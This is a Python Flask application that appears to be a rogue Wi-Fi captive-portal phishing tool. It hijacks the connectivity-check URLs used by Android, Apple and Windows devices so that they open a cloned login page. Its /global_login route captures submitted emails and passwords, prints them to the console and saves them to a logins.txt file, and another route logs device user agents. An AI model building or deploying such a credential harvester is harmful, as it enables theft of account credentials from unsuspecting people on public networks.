from flask import Flask, redirect, request,render_template,request

from config.config import get_captive_portal_current

app = Flask(__name__)

@app.route("/")
def index():
    ua = request.headers.get("User-Agent", "").lower()
   
    if "android" in ua or "captive" in ua or "connectivity" in ua:
        return redirect("/login", code=302)


   
    return render_template(f"site_static/{get_captive_portal_current()}/index.html"),200

@app.route("/login")
def login_page():
    
    return render_template(f"site_static/{get_captive_portal_current()}/index.html"),200



@app.route("/generate_204")
@app.route("/gen_204")
@app.route("/hotspot-detect.html")
@app.route("/connecttest.txt")

def captive_trigger():
    return redirect("/", code=302)

@app.errorhandler(404)
def fallback(e):
    return redirect("/", code=302)
@app.route("/global_login",methods=['POST'])
def global_login():
    if request.method == "POST":
         print(f"\033[1;35m{request.form.get("username")} Password: {request.form.get("password")}\033[0m")
         with open('./logins.txt','a') as file:
             file.write(f"Email: {request.form.get("username")} Password: {request.form.get("password")}\n")
         return render_template('global_login.html'),200
    
@app.route("/get_device",methods=['POST'])
def getdev():
    user = request.json.get("user_agent")
    print(f"User-Agent \033[1;36m{user}\033[0m")
    return "",200
    
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80 ,debug=False)
